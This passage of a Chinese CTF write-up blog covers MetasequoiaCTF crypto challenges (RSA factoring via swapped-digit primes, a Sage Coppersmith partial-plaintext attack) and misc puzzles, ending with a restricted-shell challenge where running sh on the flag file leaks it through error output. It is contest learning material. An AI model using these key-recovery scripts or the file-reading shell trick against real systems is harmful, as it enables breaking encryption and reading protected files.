s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></div>

<p>解出字符串后再经rot47解密后即为flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/crypto/Ridicule/rsa_rot47.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="rsa_rot47.png" class="fancybox"><img alt="rsa_rot47.png" title="rsa_rot47.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/crypto/Ridicule/rsa_rot47.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="Ridicule-Revenge"><a href="#Ridicule-Revenge" class="headerlink" title="Ridicule_Revenge"></a>Ridicule_Revenge</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>在你破解了Alice和Bob的通信后，他们决定不再把一条消息发送两次。他们认为，这次你一定束手无策。于是还是为了嘲讽你，他们甚至公开了加密脚本！<br>By <em>scholze</em></p>
</blockquote>
</li>
<li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRevenge/attachment.zip" target="_blank" rel="noopener">题目附件</a></p>
</li>
<li><p>考察点：RSA攻击</p>
</li>
<li><p>难度：中等</p>
</li>
<li><p>初始分值：250</p>
</li>
<li><p>最终分值：212</p>
</li>
<li><p>完成人数：7</p>
</li>
</ul>
<blockquote>
<p> 好像是个原题，能做出来全靠百度。</p>
</blockquote>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = int(gmpy2.next_prime(random.randint(<span class="number">10</span>**<span class="number">399</span>, <span class="number">10</span>**<span class="number">400</span><span class="number">-1</span>)))</span><br><span class="line">    q = int(str(p)[<span class="number">200</span>:]+str(p)[:<span class="number">200</span>])</span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"not right"</span>,p,q</span><br><span class="line">        <span class="keyword">if</span> check(p*q):</span><br><span class="line">            <span class="keyword">print</span> p*q</span><br></pre></td></tr></table></figure></div>

<p>p和q的选取比较有意思:</p>
<blockquote>
<p>p是长度400的随机素数，然后将p的前后200位互换位置，如果结果还是素数的话就作为q</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>摘录自<a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">参考链接</a></p>
<blockquote>
<p>首先我们先把<a href="https://math.jianshu.com/math?formula=p" target="_blank" rel="noopener" data-fancybox="group" data-caption="p" class="fancybox"><img alt="p" title="p" data-src="https://math.jianshu.com/math?formula=p" src="/img/loading.gif" class="lazyload"></a>)切割成两部分，前200位为<a href="https://math.jianshu.com/math?formula=a" target="_blank" rel="noopener" data-fancybox="group" data-caption="a" class="fancybox"><img alt="a" title="a" data-src="https://math.jianshu.com/math?formula=a" src="/img/loading.gif" class="lazyload"></a>)，后面的为<a href="https://math.jianshu.com/math?formula=b" target="_blank" rel="noopener" data-fancybox="group" data-caption="b" class="fancybox"><img alt="b" title="b" data-src="https://math.jianshu.com/math?formula=b" src="/img/loading.gif" class="lazyload"></a>)，则<a href="https://math.jianshu.com/math?formula=p%3Da*10%5E%7B200%7D%2Bb" target="_blank" rel="noopener" data-fancybox="group" data-caption="p=a*10^{200}+b" class="fancybox"><img alt="p=a*10^{200}+b" title="p=a*10^{200}+b" data-src="https://math.jianshu.com/math?formula=p%3Da*10%5E%7B200%7D%2Bb" src="/img/loading.gif" class="lazyload"></a>)，此时<a href="https://math.jianshu.com/math?formula=q%3Db*10%5E%7B200%7D%2Ba" target="_blank" rel="noopener" data-fancybox="group" data-caption="q=b*10^{200}+a" class="fancybox"><img alt="q=b*10^{200}+a" title="q=b*10^{200}+a" data-src="https://math.jianshu.com/math?formula=q%3Db*10%5E%7B200%7D%2Ba" src="/img/loading.gif" class="lazyload"></a>。<br>所以<a href="https://math.jianshu.com/math?formula=n%3Dp*q%3D(b*10%5E%7B200%7D%2Ba)*(a*10%5E%7B200%7D%2Bb)%3D(a*b*10%5E%7B400%7D%2B(b%5E2%2Ba%5E2)*10%5E%7B200%7D%2Ba*b)" target="_blank" rel="noopener" data-fancybox="group" data-caption="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" class="fancybox"><img alt="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" title="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" data-src="https://math.jianshu.com/math?formula=n%3Dp*q%3D(b*10%5E%7B200%7D%2Ba)*(a*10%5E%7B200%7D%2Bb)%3D(a*b*10%5E%7B400%7D%2B(b%5E2%2Ba%5E2)*10%5E%7B200%7D%2Ba*b)" src="/img/loading.gif" class="lazyload"></a>)不难发现<a href="https://math.jianshu.com/math?formula=n" target="_blank" rel="noopener" data-fancybox="group" data-caption="n" class="fancybox"><img alt="n" title="n" data-src="https://math.jianshu.com/math?formula=n" src="/img/loading.gif" class="lazyload"></a>)最低200位是<a href="https://math.jianshu.com/math?formula=a*b" target="_blank" rel="noopener" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)的低200位，<a href="https://math.jianshu.com/math?formula=n" target="_blank" rel="noopener" data-fancybox="group" data-caption="n" class="fancybox"><img alt="n" title="n" data-src="https://math.jianshu.com/math?formula=n" src="/img/loading.gif" class="lazyload"></a>)最高200位是<a href="https://math.jianshu.com/math?formula=a*b" target="_blank" rel="noopener" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)的高200位（或者<a href="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" target="_blank" rel="noopener" data-fancybox="group" data-caption="a^2+b^2" class="fancybox"><img alt="a^2+b^2" title="a^2+b^2" data-src="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" src="/img/loading.gif" class="lazyload"></a>)进一位）而<a href="https://math.jianshu.com/math?formula=p" target="_blank" rel="noopener" data-fancybox="group" data-caption="p" class="fancybox"><img alt="p" title="p" data-src="https://math.jianshu.com/math?formula=p" src="/img/loading.gif" class="lazyload"></a>)是400位，所以<a href="https://math.jianshu.com/math?formula=a%2Cb" target="_blank" rel="noopener" data-fancybox="group" data-caption="a,b" class="fancybox"><img alt="a,b" title="a,b" data-src="https://math.jianshu.com/math?formula=a%2Cb" src="/img/loading.gif" class="lazyload"></a>)都为200位，所以<a href="https://math.jianshu.com/math?formula=a*b" target="_blank" rel="noopener" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)也为400位，所以此时得到就是<a href="https://math.jianshu.com/math?formula=a*b" target="_blank" rel="noopener" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>。<br>此时我们用<a href="https://math.jianshu.com/math?formula=a*b" target="_blank" rel="noopener" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)去代入上述等式，求出<a href="https://math.jianshu.com/math?formula=(a%5E2%2Bb%5E2)*10%5E%7B200%7D" target="_blank" rel="noopener" data-fancybox="group" data-caption="(a^2+b^2)*10^{200}" class="fancybox"><img alt="(a^2+b^2)*10^{200}" title="(a^2+b^2)*10^{200}" data-src="https://math.jianshu.com/math?formula=(a%5E2%2Bb%5E2)*10%5E%7B200%7D" src="/img/loading.gif" class="lazyload"></a>)。此时我们可以根据得到的值后200位是否全为0，从而判断<a href="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" target="_blank" rel="noopener" data-fancybox="group" data-caption="a^2+b^2" class="fancybox"><img alt="a^2+b^2" title="a^2+b^2" data-src="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" src="/img/loading.gif" class="lazyload"></a>)是进了一位的。然后两个变量两个等式算出<a href="https://math.jianshu.com/math?formula=a" target="_blank" rel="noopener" data-fancybox="group" data-caption="a" class="fancybox"><img alt="a" title="a" data-src="https://math.jianshu.com/math?formula=a" src="/img/loading.gif" class="lazyload"></a>)，<a href="https://math.jianshu.com/math?formula=b" target="_blank" rel="noopener" data-fancybox="group" data-caption="b" class="fancybox"><img alt="b" title="b" data-src="https://math.jianshu.com/math?formula=b" src="/img/loading.gif" class="lazyload"></a>。</p>
</blockquote>
<h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.jianshu.com/p/763427ea0e4b</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">n = <span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">tmp = <span class="number">10</span>**<span class="number">200</span></span><br><span class="line"><span class="comment">#abhigh,ablow = n/(tmp^3), n % tmp</span></span><br><span class="line">abhigh,ablow = n/(tmp**<span class="number">3</span>)<span class="number">-1</span>, n % tmp</span><br><span class="line">ab = abhigh*tmp+ablow</span><br><span class="line"><span class="comment"># a**2+b**2</span></span><br><span class="line">a2b2 = (n-ab*(tmp**<span class="number">2</span>)-ab)/tmp</span><br><span class="line"><span class="comment">#print a2b2</span></span><br><span class="line"><span class="comment">#(a-b),(a+b)</span></span><br><span class="line">tmp1 = gmpy2.iroot(a2b2<span class="number">-2</span>*ab,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">tmp2 = gmpy2.iroot(a2b2+<span class="number">2</span>*ab,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">a = (tmp1+tmp2)/<span class="number">2</span></span><br><span class="line">b = a-tmp1</span><br><span class="line">p = a*tmp + b</span><br><span class="line">q = n/p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,p*q)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure></div>


<h2 id="Ridicule-Rerevengevenge-unsolved"><a href="#Ridicule-Rerevengevenge-unsolved" class="headerlink" title="Ridicule_Rerevengevenge [unsolved]"></a>Ridicule_Rerevengevenge [unsolved]</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>在你再次成功破解他们的通信之后，Alice和Bob依然没有停止对你的嘲讽——这一次，你甚至可以得到残缺的明文！<br>注：flag为明文的隐藏部分，flag格式为<code>flag{16进制数}</code><br>By <em>scholze</em><br>hint: Sage</p>
</blockquote>
</li>
<li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRerevengevenge/attachment.zip" target="_blank" rel="noopener">题目附件</a></p>
</li>
<li><p>考察点：RSA攻击</p>
</li>
<li><p>难度：困难</p>
</li>
<li><p>初始分值：400</p>
</li>
<li><p>最终分值：368</p>
</li>
<li><p>完成人数：5</p>
</li>
</ul>
<blockquote>
<p>数学…太南了…看官方wp给的<a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">参考链接</a>竟是我本科社团学弟的文章…唉…自愧不如……</p>
</blockquote>
<h3 id="直接贴出官方wp"><a href="#直接贴出官方wp" class="headerlink" title="直接贴出官方wp"></a>直接贴出官方wp</h3><p>去<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">这里</a>，选择<code>sage</code>，然后参考<a href="https://code.felinae98.cn/ctf/crypto/rsa大礼包%EF%BC%88二%EF%BC%89coppersmith-相关" target="_blank" rel="noopener">这篇文章</a></p>
<p>转成十进制后再用如下代码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m = randrange(n)</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta ^ <span class="number">2</span> / <span class="number">7</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = floor(nbits * (beta ^ <span class="number">2</span> / e - epsilon))</span><br><span class="line"><span class="comment"># mbar = m &amp; (2^nbits-2^kbits)</span></span><br><span class="line">mbar = <span class="number">0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000</span></span><br><span class="line">c = <span class="number">0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75</span></span><br><span class="line"><span class="comment">#print "upper %d bits (of %d bits) is given" % (nbits - kbits, nbits)</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">m</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n1</span></span><br><span class="line">mbar + x0</span><br></pre></td></tr></table></figure></div>

<p>解得:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a4a8c1d4dec4a0e9bf1</span><br></pre></td></tr></table></figure></div>
<p>则对比原来的16进制发现flag为<code>flag{4a8c1d4dec4a0e9bf1}</code>。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>有一到题解出了密文，但是没看出来是base32加密，最后与flag无缘…misc真是太杂了…</p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>欢迎来到MetasequoiaCTF！请扫描二维码完成比赛签到。<br>By <em>FLAG挖掘机</em></p>
</blockquote>
</li>
<li><p>考察点：ps</p>
</li>
<li><p>难度：入门</p>
</li>
<li><p>初始分值：100</p>
</li>
<li><p>最终分值：20</p>
</li>
<li><p>完成人数：37</p>
</li>
</ul>
<p>给的二维码扫不了</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/%E4%B8%8D%E6%98%AF%E4%BA%8C%E7%BB%B4%E7%A0%81.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="不是二维码.png" class="fancybox"><img alt="不是二维码.png" title="不是二维码.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/%E4%B8%8D%E6%98%AF%E4%BA%8C%E7%BB%B4%E7%A0%81.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>用ps去掉绿色干扰部分，扫码即可</p>
<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/qr-de.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="qrd" class="fancybox"><img alt="qrd" style="zoom:38%;" title="qrd" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/qr-de.png" src="/img/loading.gif" class="lazyload"></a>



<h2 id="Rabbit-Hole"><a href="#Rabbit-Hole" class="headerlink" title="Rabbit Hole"></a>Rabbit Hole</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>一只奇怪的兔子钻进洞里啦，赶紧把它揪出来。 </p>
<p><a href="http://rabbit.yoshino-s.org/" target="_blank" rel="noopener">http://rabbit.yoshino-s.org/</a> </p>
<p>By <em>Yoshino-s</em></p>
</blockquote>
</li>
<li><p>考察点：dig命令、rabbit加密</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：100</p>
</li>
<li><p>最终分值：62</p>
</li>
<li><p>完成人数：9</p>
</li>
</ul>
<p>访问网页，得到提示：</p>
<blockquote>
<p>To catch the rabbit, you should dig deeper and find the txt.</p>
</blockquote>
<p>用dig命令查询这个题目url的TXT记录：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig -t TXT rabbit.yoshino-s.org</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1ubuntu2.6-Ubuntu &lt;&lt;&gt;&gt; -t TXT rabbit.yoshino-s.org</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 54090</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;rabbit.yoshino-s.org.		IN	TXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">rabbit.yoshino-s.org.	300	IN	TXT	"U2FsdGVkX18BkpB/W9lD7ZGSP5BprjbrL/WKn+7fn8gWCXpmDW+y/5FoVYPd5pIFCZfHFiov"</span><br><span class="line"></span><br><span class="line">;; Query time: 192 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="line">;; WHEN: 四 2月 20 20:30:40 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 134</span><br></pre></td></tr></table></figure></div>

<p>在<code>ANSWER SECTION:</code>中得到密文，<a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit解密</a>后即为flag</p>
<blockquote>
<p>flag{0d23348ede942398962778bf49c59776}</p>
</blockquote>
<h2 id="Dont-use-Mac-unsolved"><a href="#Dont-use-Mac-unsolved" class="headerlink" title="Dont use Mac [unsolved]"></a>Dont use Mac [unsolved]</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>解答本题时请不要使用Mac。<br>By <em>FLAG挖掘机</em><br>hint: Plz, check everything you’ve got.    </p>
</blockquote>
</li>
<li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Misc/Don' target=" _blank" rel="noopener" tusemac attachment.zip">题目附件</a></p>
</li>
<li><p>考察点：.DS_Store信息泄漏</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：200</p>
</li>
<li><p>最终分值：170</p>
</li>
<li><p>完成人数：6</p>
</li>
</ul>
<blockquote>
<p>比赛的时候没有解出来，后来看了官方wp，其实就差一点点儿了</p>
<p>还是自己对各种常见加密不够敏感…wtcl</p>
</blockquote>
<h3 id="官方wp-2"><a href="#官方wp-2" class="headerlink" title="官方wp"></a>官方wp</h3><p>解压缩包发现有一个文件夹和一张图片，图片里藏了压缩包，但实际上这里是误区，真正的flag是藏在<code>__MACOSX</code>文件夹下，这个文件夹通常是在解压缩的时候会存在，<code>__MACOSX</code> 中的<code>.DS_Store</code>里存在可疑字符串,通过Base32+ROT13即可得到答案。这里要注意的是，Mac上在解压缩的时候会在建立文件夹的时候覆盖掉<code>.DS_Store</code>，这也是题目名字的暗示。</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>查找字符串：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rabin2 -zz ./__MACOSX/.DS_Store </span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type    string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x00000004 0x00000004 4   5            ascii   Bud1</span><br><span class="line">1   0x00000060 0x00000060 4   5            ascii   bwsp</span><br><span class="line">2   0x00000070 0x00000070 32  33           ascii   ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=</span><br><span class="line">3   0x0000020f 0x0000020f 8   17           utf16le \b__MACOS</span><br><span class="line">4   0x00000220 0x00000220 8   9            ascii   bwspblob</span><br><span class="line">5   0x0000022c 0x0000022c 8   9            ascii   bplist00</span><br><span class="line">6   0x0000023b 0x0000023b 59  60           ascii   \a\b\b\n\b\n\r\n]ShowStatusBar[ShowPathbar[ShowToolbar[ShowTabView_</span><br><span class="line">7   0x00000278 0x00000278 51  52           ascii   </span><br><span class="line">8   0x000002ad 0x000002ad 26  27           ascii   &#123;&#123;370, 215&#125;, &#123;770, 436&#125;&#125;\t\b</span><br><span class="line">9   0x000002c8 0x000002c8 12  13           ascii   %1=I`myz&#123;|&#125;~</span><br><span class="line">10  0x000002f8 0x000002f8 8   17           utf16le \b__MACOS</span><br><span class="line">11  0x00000309 0x00000309 8   9            ascii   lg1Scomp</span><br><span class="line">12  0x0000031c 0x0000031c 8   17           utf16le \b__MACOS</span><br><span class="line">13  0x0000032d 0x0000032d 8   9            ascii   moDDblob</span><br><span class="line">14  0x00000348 0x00000348 6   13           utf16le _MACOS</span><br><span class="line">15  0x00000355 0x00000355 8   9            ascii   modDblob</span><br><span class="line">16  0x00000370 0x00000370 6   13           utf16le _MACOS</span><br><span class="line">17  0x0000037d 0x0000037d 8   9            ascii   ph1Scomp</span><br><span class="line">18  0x00000390 0x00000390 8   17           utf16le \b__MACOS</span><br><span class="line">19  0x000003a1 0x000003a1 8   9            ascii   vSrnlong</span><br><span class="line">20  0x00001411 0x00001411 4   5            ascii   DSDB</span><br></pre></td></tr></table></figure></div>

<p>得到字符串：</p>
<blockquote>
<p>ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=</p>
</blockquote>
<p>解密：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/Dont%20Use%20Mac/mac.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="mac.png" class="fancybox"><img alt="mac.png" title="mac.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/Dont%20Use%20Mac/mac.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="rm-rf"><a href="#rm-rf" class="headerlink" title="rm -rf /"></a>rm -rf /</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>出题人不会出题，只好把系统命令删了让大家来猜flag。<br>注：请使用<code>nc</code>连接容器，浏览器访问是无效的。<br>By <em>FLAG挖掘机</em>                     </p>
</blockquote>
</li>
<li><p>考察点：linux命令、shell编程</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：250</p>
</li>
<li><p>最终分值：244</p>
</li>
<li><p>完成人数：3</p>
</li>
</ul>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><code>nc</code>连过去，有一次执行命令的机会，直接执行sh即可拿到shell</p>
<p>看了下<code>/bin</code>目录下的文件，删除了有输出功能的<code>cat</code>、<code>grep</code>等命令，不过<code>sh</code>还在，只要<code>sh .flag</code>，就能从<code>stderr</code>中读到flag</p>
<blockquote>
<p>sh 会逐条执行文本中的命令，命令不存在时会报错 e.g.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sh txt </span></span><br><span class="line">txt: 1: txt: xxxx: not found</span><br></pre></td></tr></table></figure></div>
</blockquote>
